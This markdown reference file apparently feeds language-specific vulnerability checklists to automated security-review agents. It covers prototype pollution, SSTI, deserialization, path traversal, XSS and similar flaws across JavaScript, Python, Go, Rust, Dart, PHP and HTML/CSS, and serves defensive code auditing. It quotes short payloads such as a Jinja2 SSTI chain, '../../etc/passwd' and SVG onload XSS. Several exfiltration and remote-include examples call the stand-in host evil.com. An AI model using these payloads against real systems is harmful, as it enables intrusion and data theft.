# Language-Specific Attack Profiles

Attack profiles for language-specific attack vectors used by attack-review agents.
Based on `detected_languages` in `context.json`, only the relevant sections are injected into agent prompts.

---

## TypeScript / JavaScript

### Server (Node.js)

- **Prototype pollution** via `__proto__`, `constructor.prototype` — especially in deep merge libraries (`lodash.merge`, `deepmerge`, `hoek`, hand-rolled recursive merge). Look for any function that recursively copies properties from untrusted input into an object
- **Code injection** via `eval()`, `Function()`, `vm.runInContext()`, `vm.runInNewContext()` — any path where user input reaches these sinks, including indirect flows through template engines or configuration loaders
- **ReDoS** (catastrophic backtracking in regex) — look for nested quantifiers (`(a+)+`), alternation with overlap (`(a|a)+`), and regexes applied to user-controlled strings without length limits
- **Deserialization attacks** — `node-serialize`, `funcster`, or any library that revives functions from serialized data. `JSON.parse()` itself is safe, but post-parse processing may not be
- **Event loop blocking** — synchronous crypto operations (`crypto.pbkdf2Sync`), large `JSON.parse()`, CPU-bound loops in request handlers. Any of these enable application-level DoS
- **Path traversal** via `path.join()` with user input — `path.join('/base', userInput)` does NOT resolve `../`, so `../../etc/passwd` passes through. Must validate with `path.resolve()` + prefix check
- **Template literal injection** in tagged templates — if a tagged template function processes user input as a template part rather than a value, it can bypass escaping
- **npm supply chain** — typosquatting packages, `preinstall`/`postinstall` scripts executing arbitrary code, dependency confusion (private package name collision with public registry)
- **SSRF** in server-side `fetch()` / `axios` / `got` / `node-fetch` with user-controlled URLs — can reach internal services, cloud metadata endpoints (`169.254.169.254`), or local network. Check for URL allowlist/blocklist and DNS rebinding protection
- **Buffer handling** — `Buffer.allocUnsafe(n)` returns uninitialized memory (may contain secrets), `Buffer(number)` (deprecated) does the same. Also check for improper encoding handling in `Buffer.from()`

### Client (Browser)

- **DOM XSS** via `innerHTML`, `outerHTML`, `document.write()`, `eval()`, `setTimeout(string)`, `setInterval(string)`, `new Function(string)` — any path where user data reaches these sinks
- **Prototype pollution** via URL query params (`?__proto__[isAdmin]=true`) or `JSON.parse()` + recursive merge on client-side config/state objects
- **postMessage origin validation** — check that `event.origin` is validated against a strict allowlist (not `*`, not a substring match, not missing entirely). Verify the handler doesn't blindly trust message content
- **Service Worker scope hijacking** — a Service Worker registered at a broader scope can intercept requests meant for other paths. Check registration scope and update mechanisms
- **CSP bypass patterns** — JSONP endpoints as `script-src` allowlist entries, `unsafe-inline`, `unsafe-eval`, `data:` URI in script-src, `base-uri` missing, overly broad `connect-src`
- **Open redirect** via `window.location`, `location.href`, `location.assign()`, `location.replace()` — check for user-controlled redirect targets without allowlist validation
- **DOM Clobbering** — HTML elements with `id` or `name` attributes can shadow global variables (`document.getElementById` is safe, but direct property access like `window.someId` is not). Exploitable when user-controlled HTML is inserted even after sanitization
- **Source map exposure** — `.map` files deployed to production leak original source code, internal paths, variable names
- **Sensitive data in Web Storage** — `localStorage` / `sessionStorage` contents are accessible to any XSS on the same origin. Tokens, PII, and secrets must not be stored here
- **Web Worker message injection** — Workers that accept messages without validating the sender origin or message structure can be exploited to execute unintended operations

---

## Python

- **Pickle deserialization RCE** — `pickle.loads()`, `pickle.load()`, `shelve`, `joblib.load()`, and any framework that uses pickle under the hood (e.g., some caching backends). Untrusted data + pickle = arbitrary code execution
- **Code injection** via `eval()`, `exec()`, `compile()` with user input — includes indirect paths through config parsers, mathematical expression evaluators, or ORM query builders that use `eval`
- **SSTI (Server-Side Template Injection)** — Jinja2 (`{{ config }}`, `{{ ''.__class__.__mro__[1].__subclasses__() }}`), Mako (`${...}`), Django templates (less dangerous but still possible). Look for user input rendered as template source rather than template variable
- **SQL injection** via f-strings / `.format()` / `%` string formatting in queries — even with ORMs, raw query methods (`Model.objects.raw()`, `db.execute()`, `engine.execute()`) are vulnerable if parameterization is skipped
- **SSRF** via `requests.get()`, `urllib.request.urlopen()`, `httpx` without URL scheme/host validation — check for internal network access, cloud metadata endpoint access, and file:// scheme
- **Path traversal** via `os.path.join()` — if the second argument is an absolute path (starts with `/`), it DISCARDS the base path entirely. Must validate with `os.path.commonpath()` or `pathlib.PurePath.is_relative_to()`
- **YAML deserialization** — `yaml.load(data)` without `Loader=SafeLoader` (or `yaml.safe_load()`) allows arbitrary Python object construction = code execution. Default `Loader` in older PyYAML versions is `FullLoader` which is also partially vulnerable
- **Command injection** — `subprocess.call/run/Popen` with `shell=True` + user input in the command string. Also `os.system()`, `os.popen()`. Even with `shell=False`, unsanitized arguments can be dangerous for certain executables
- **Dynamic import abuse** — `__import__()`, `importlib.import_module()` with user-controlled module names can load arbitrary modules
- **Django-specific** — `DEBUG=True` in production (full stack traces, settings exposure), `SECRET_KEY` in source control or environment without rotation, mass assignment via `ModelForm` without explicit `fields` (using `fields = '__all__'`), `extra` fields in formsets, `JsonResponse` of QuerySet without serialization control
- **Flask-specific** — debug mode with Werkzeug debugger PIN (achievable RCE), session cookie signed with weak/default `secret_key`, `send_file()` / `send_from_directory()` with user-controlled path

---

## Go

- **SQL injection** via `fmt.Sprintf` / string concatenation in query strings — Go's `database/sql` supports `?` / `$1` placeholders, but developers sometimes bypass them. Check all `db.Query()`, `db.Exec()` calls for interpolated user input
- **Command injection** via `os/exec.Command` — if the command name or arguments are user-derived, arbitrary command execution is possible. Even with argument-only injection, flag injection can be dangerous (`--output=/etc/crontab`)
- **Integer overflow/underflow** — Go integers wrap silently. `uint` to `int` conversions, arithmetic on lengths/sizes derived from user input, allocation sizes calculated from untrusted values
- **Goroutine leak / unbounded goroutine spawn** — launching a goroutine per request without concurrency limits enables resource exhaustion DoS. Look for missing `context.Done()` checks, unbuffered channel reads without timeout, and `go func()` without semaphore
- **Missing `context.WithTimeout` propagation** — if a parent context has a deadline but child operations (DB queries, HTTP calls) don't propagate it, slow downstream services can hold resources indefinitely
- **Race conditions** — shared state accessed from multiple goroutines without `sync.Mutex` / `sync.RWMutex` / channels / `sync/atomic`. Run mental model with `-race` flag scenarios. Common in global caches, counters, and connection pools
- **Insecure TLS configuration** — `tls.Config{InsecureSkipVerify: true}` disables certificate verification entirely. Also check for hardcoded minimum TLS versions, weak cipher suites, and missing certificate pinning where required
- **Path traversal** via `filepath.Join()` — like Node.js, `filepath.Join("/base", userInput)` does not prevent `../` traversal. Must call `filepath.Clean()` then verify the result starts with the intended base path
- **`html/template` vs `text/template` confusion** — `text/template` performs NO escaping. If used to render HTML with user data, it's a direct XSS vector. Verify that HTTP handlers use `html/template` exclusively
- **Error wrapping leaking internals** — `fmt.Errorf("failed: %v", err)` or `errors.Wrap` that propagate internal details (DB connection strings, file paths, stack traces) to HTTP responses. Check error middleware
- **SSRF** via `http.Get()` / `http.DefaultClient.Do()` with user-controlled URL — same risks as other languages. Go's default `http.Client` follows redirects (up to 10), which can amplify SSRF via redirect chains to internal endpoints

---

## Rust

- **`unsafe` block misuse** — buffer overflows, use-after-free, data races, uninitialized memory reads. Every `unsafe` block is a potential vulnerability boundary. Audit all `unsafe` for soundness, especially around raw pointer dereference and `transmute`
- **FFI boundary vulnerabilities** — passing raw pointers to C libraries, incorrect lifetime assumptions across the FFI boundary, missing null checks on C return values, size/alignment mismatches. `CString` / `CStr` conversion errors can cause memory corruption
- **Integer overflow in release mode** — debug builds panic on overflow, but release builds wrap silently. Any arithmetic on user-controlled values (sizes, indices, offsets) can produce unexpected results. Use `checked_*` / `saturating_*` / `wrapping_*` methods explicitly
- **`.unwrap()` / `.expect()` in request handlers** — panics in request handlers cause the handler thread/task to abort. In single-threaded runtimes or without panic recovery middleware, this is a DoS vector. Look for unwrap on any operation that can fail due to user input
- **SQL injection in raw queries** — `sqlx::query!` macro is compile-time checked and safe, but `sqlx::query()` (runtime string), `diesel::sql_query()`, and any raw SQL string are injection vectors
- **Command injection** via `std::process::Command` — if command name or arguments come from user input. `.arg()` doesn't use a shell so it's somewhat safer than shell-based approaches, but flag/argument injection is still possible
- **Timing side-channels** — standard `==` comparison on secrets (tokens, passwords, HMAC values) leaks information via timing. Use `constant_time_eq` crate or `ring::constant_time::verify_slices_are_equal`
- **SSRF** via `reqwest` / `hyper` with user-controlled URLs — same pattern as other languages. `reqwest` follows redirects by default
- **Deserialization with serde** — `serde_json::from_str()` with untrusted input can cause: large allocation DoS (deeply nested JSON, huge arrays), type confusion if using `#[serde(untagged)]` enums, and unexpected behavior with `#[serde(flatten)]` + unknown fields
- **WebAssembly boundary trust** — WASM modules compiled from Rust may be treated as trusted, but the WASM sandbox doesn't protect the host from logic bugs. Data crossing the WASM boundary (via exported functions) must still be validated

---

## Dart

- **`dart:mirrors` reflection abuse** — disabled in AOT compilation (production Flutter) but available in JIT mode (tests, Dart VM). If reflection-dependent code paths exist, they can be exploited in non-AOT environments
- **Insecure HTTP (cleartext traffic)** — Flutter apps default to HTTPS, but developers may enable cleartext for development and forget to disable it. Check `android:usesCleartextTraffic="true"` in `AndroidManifest.xml` and missing `NSAppTransportSecurity` restrictions in `Info.plist`
- **WebView JavaScript bridge** — `JavaScriptChannel` allows JS in WebViews to call Dart code. If the bridge handler doesn't validate the origin of the WebView content or the message payload, it's an injection vector
- **Deep link / custom scheme hijacking** — Android intent-filter collisions allow malicious apps to register the same scheme/host and intercept deep links meant for the legitimate app. Check for `android:autoVerify="true"` on App Links and proper fallback handling
- **Sensitive data in Shared Preferences / NSUserDefaults** — stored as plaintext XML (Android) or plist (iOS). Tokens, passwords, PII should use `flutter_secure_storage` (Keychain/Keystore) instead
- **Certificate pinning** — Dart/Flutter has no built-in certificate pinning. Without a pinning plugin (`ssl_pinning_plugin`, `dio_http_certificate_pinning`), MITM proxies with trusted CA certs can intercept all traffic
- **Dart FFI `Pointer` manipulation** — `dart:ffi` allows direct memory access. Incorrect pointer arithmetic, use-after-free, and buffer overflows are possible in the same way as C. Audit all `Pointer<>` usage
- **JSON decoding DoS** — `dart:convert` `jsonDecode()` with untrusted input can allocate enormous structures (deeply nested objects, huge lists). No built-in depth/size limit exists
- **Platform channel message injection** — `MethodChannel` and `EventChannel` messages between Dart and native code can be spoofed if the channel name is predictable and the app doesn't validate the caller

---

## PHP

### Modern (Composer-Managed)

- **SQL injection** — PDO without prepared statements (using string concatenation/interpolation in queries), `$wpdb->query()` with interpolation, Eloquent `whereRaw()` / `DB::raw()` with user input
- **Code injection** via `eval()`, `assert()` (acts as `eval` in PHP < 8.0), `preg_replace()` with `/e` modifier (removed in 7.0 but may exist in dependencies). Also `create_function()` (deprecated 7.2, removed 8.0)
- **File inclusion (LFI/RFI)** — `include`, `require`, `include_once`, `require_once` with any user-influenced path component. Even partial control (directory or extension) can be exploitable via null bytes (< 5.3.4), wrappers (`php://filter`, `data://`), or log poisoning
- **Object injection via `unserialize()`** — user-controlled data passed to `unserialize()` allows instantiation of arbitrary classes, triggering `__wakeup()`, `__destruct()`, `__toString()` POP chains. Modern equivalent: check for `unserialize()` in session handlers, cache drivers, queue workers
- **Variable overwrite** — `extract()` on user input (`$_GET`, `$_POST`, `$_REQUEST`) overwrites local/global variables. `parse_str()` without second argument (PHP < 7.2) registers variables in current scope
- **Type juggling** in authentication — `==` (loose comparison) treats `"0e123" == "0e456"` as `true` (both are `0` in scientific notation). Critical in password hash comparisons, token validation, HMAC verification. Must use `===` or `hash_equals()`
- **Mail header injection** — `mail()` function allows CRLF injection in headers (To, CC, BCC, Subject) to add arbitrary recipients or inject body content
- **Insecure file upload** — MIME type spoofing (`Content-Type` header is client-controlled), double extension attacks (`file.php.jpg` with misconfigured Apache), null byte in filename (< 5.3.4), upload to web-accessible directory with PHP execution enabled
- **Laravel-specific** — mass assignment without `$guarded` / `$fillable` defined, `APP_DEBUG=true` in production (Ignition error page with code execution), `.env` file accessible via web, blade `{!! !!}` unescaped output with user data
- **Symfony-specific** — profiler/debug toolbar accessible in production (`_profiler`, `_wdt` routes), YAML deserialization of untrusted input, misconfigured voter/access control allowing privilege escalation

### Legacy (PHP 5.x)

All vectors from Modern PHP apply, PLUS:

- **`register_globals`** (on by default < 5.0, deprecated 5.3, removed 5.4) — all GET/POST/COOKIE parameters auto-registered as global variables, enabling variable injection (`?is_admin=1`)
- **`magic_quotes_gpc` disabled** — if off (default since 5.4, removed), all `$_GET` / `$_POST` / `$_COOKIE` values are completely raw. If on, developers rely on it instead of proper escaping, which fails for integer injection and non-SQL contexts
- **`mysql_*` functions** — no prepared statement support, `mysql_real_escape_string()` is the only defense (and fails for integer parameters, charset attacks). `mysql_query()` with string interpolation = SQL injection
- **`preg_replace` with `/e` modifier** — the replacement string is evaluated as PHP code. Equivalent to `eval()` on matched content. Still present in PHP 5.x codebases
- **No `password_hash()`** (added 5.5) — likely using `md5()`, `sha1()`, or `crypt()` without salt, or with static/predictable salt. Password storage is almost certainly broken
- **`allow_url_include` / `allow_url_fopen`** — often enabled, allowing `include("http://evil.com/shell.php")` and URL-based file operations
- **Session fixation** — no `session_regenerate_id()` on authentication state change, allowing attackers to set a known session ID before the victim logs in
- **Error display** — `display_errors = On` + `error_reporting = E_ALL` in production, leaking full file paths, database connection strings, and stack traces
- **Null byte injection** — `%00` in file paths truncates the string at the C level (PHP < 5.3.4), bypassing extension checks: `include("uploads/" . $file . ".php")` with `$file = "../../etc/passwd%00"`

---

## HTML / CSS

- **Inline event handlers with dynamic data** — `onclick`, `onerror`, `onload`, `onfocus`, `onmouseover`, and all other `on*` attributes. If any user data is interpolated into these attributes, it's XSS regardless of HTML encoding (the attribute value is already a JS execution context)
- **`javascript:` URI scheme** — in `href`, `src`, `action`, `formaction`, `data`, `poster`, `background` attributes. HTML entity encoding does NOT prevent execution: `&#106;avascript:alert(1)` still works
- **CSS injection** via user-controlled style values — attribute selectors combined with `background-image` URL requests can exfiltrate data character-by-character (`input[value^="a"] { background: url(https://evil.com/?a) }`). Also enables UI redressing and content spoofing
- **`@import` injection** — if user data appears in a `<style>` block or `style` attribute, `@import url(...)` can load external stylesheets that override page styling or exfiltrate data via CSS selectors
- **Form action hijacking** — injecting or overriding the `action` attribute on a `<form>` tag to redirect form submissions (including CSRF tokens, credentials) to an attacker-controlled endpoint
- **Meta refresh redirect** — `<meta http-equiv="refresh" content="0;url=...">` with user-controlled URL enables open redirect. Some sanitizers miss this because it's not a `<script>` tag
- **Dangling markup injection** — an unclosed tag (e.g., `<img src="https://evil.com/?`) captures all subsequent HTML content until a matching quote is found, exfiltrating page content including tokens and sensitive data via the `src` URL
- **SVG-based XSS** — `<svg onload=alert(1)>`, `<svg><script>...</script></svg>`, and SVG `use` with external references. Critical in user-uploaded content (avatars, rich text editors) where SVG is allowed but not properly sanitized
- **Base tag injection** — `<base href="https://evil.com/">` causes all relative URLs on the page (scripts, stylesheets, images, links) to resolve against the attacker's domain. A single injection point can compromise the entire page

---

## Usage Notes

- Each bullet point should be treated as a "look for this pattern in the code" instruction for the receiving agent
- Agents should cross-reference these language-specific patterns with the generic `attack-criteria.md` checklist
- For multi-language projects, agents receive all relevant language sections (e.g., both Go and TypeScript Server for a full-stack API, TypeScript Client + HTML/CSS for frontend)
- Legacy PHP (5.x) includes all modern PHP vectors plus legacy-specific ones -- agents receiving the Legacy section do NOT also need the Modern section separately
- When a project uses a framework (Django, Flask, Laravel, Symfony, etc.), the framework-specific sub-bullets become high priority since these represent the most commonly exploited misconfiguration patterns
